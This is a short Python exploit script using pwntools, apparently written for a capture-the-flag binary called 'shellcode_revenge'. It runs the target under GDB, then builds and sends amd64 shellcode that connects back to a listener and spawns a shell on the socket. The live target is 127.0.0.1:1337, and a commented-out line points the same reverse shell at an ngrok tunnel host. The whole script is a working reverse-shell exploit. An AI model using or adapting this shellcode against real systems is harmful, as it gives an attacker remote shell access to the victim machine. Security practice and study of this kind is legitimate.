#!/usr/bin/python3
from pwn import *
import socket
context.binary = exe = ELF("./shellcode_revenge")

def GDB():
    gdb.attach(p,gdbscript='''
    b* main +208
    c
    ''')
    input()
p = process(exe.path)
GDB()
# payload = pwnlib.shellcraft.amd64.linux.connect("0.tcp.ap.ngrok.io", 16549, network='ipv4')
payload = pwnlib.shellcraft.amd64.linux.connect("127.0.0.1", 1337, network='ipv4')
payload += pwnlib.shellcraft.amd64.linux.dupsh(sock='rbp')
print(asm(payload))
p.sendline(bytes(asm(payload)))
p.interactive()